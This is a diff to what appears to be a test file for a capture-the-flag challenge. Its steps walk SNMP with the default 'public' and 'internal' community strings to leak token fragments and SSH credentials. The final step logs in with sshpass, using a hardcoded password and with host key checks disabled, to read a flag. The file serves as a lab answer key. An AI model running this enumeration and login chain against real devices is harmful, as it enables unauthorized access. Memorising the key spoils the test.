@@ -69,26 +69,26 @@ topology:
 test:
   steps:
     - name: "SNMP public walk returns sysDescr with hidden community hint"
-      command: "snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.1.0 2>/dev/null | head -1"
+      command: "snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.1.0 2>&1 | head -1"
       expect: "internal-community: internal"
       timeout: 15
 
     - name: "Extract token fragment from public sysDescr"
-      command: "snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.1.0 2>/dev/null | grep -o 'Token: [a-z0-9_]*' | awk '{print $2}'"
+      command: "snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.1.0 2>&1 | grep -o 'Token: [a-z0-9_]*' | awk '{print $2}'"
       expect: "snmp_ch41n"
       timeout: 15
 
     - name: "SNMP internal walk returns sysContact with SSH credentials"
-      command: "snmpwalk -v2c -c internal -t 5 {target.target} 1.3.6.1.2.1.1.4.0 2>/dev/null | head -1"
+      command: "snmpwalk -v2c -c internal -t 5 {target.target} 1.3.6.1.2.1.1.4.0 2>&1 | head -1"
       expect: "ops_user"
       timeout: 15
 
     - name: "Extract token fragment from internal sysContact"
-      command: "snmpwalk -v2c -c internal -t 5 {target.target} 1.3.6.1.2.1.1.4.0 2>/dev/null | grep -o 'Token: [a-z0-9_]*' | awk '{print $2}'"
+      command: "snmpwalk -v2c -c internal -t 5 {target.target} 1.3.6.1.2.1.1.4.0 2>&1 | grep -o 'Token: [a-z0-9_]*' | awk '{print $2}'"
       expect: "l0g1n"
       timeout: 15
 
     - name: "SSH login and read flag"
-      command: "sshpass -p 'R1dg3_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ops_user@{target.target} 'cat ~/flag.txt' 2>/dev/null"
+      command: "sshpass -p 'R1dg3_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ops_user@{target.target} 'cat ~/flag.txt' 2>&1"
       expect: "OCR{"
       timeout: 20
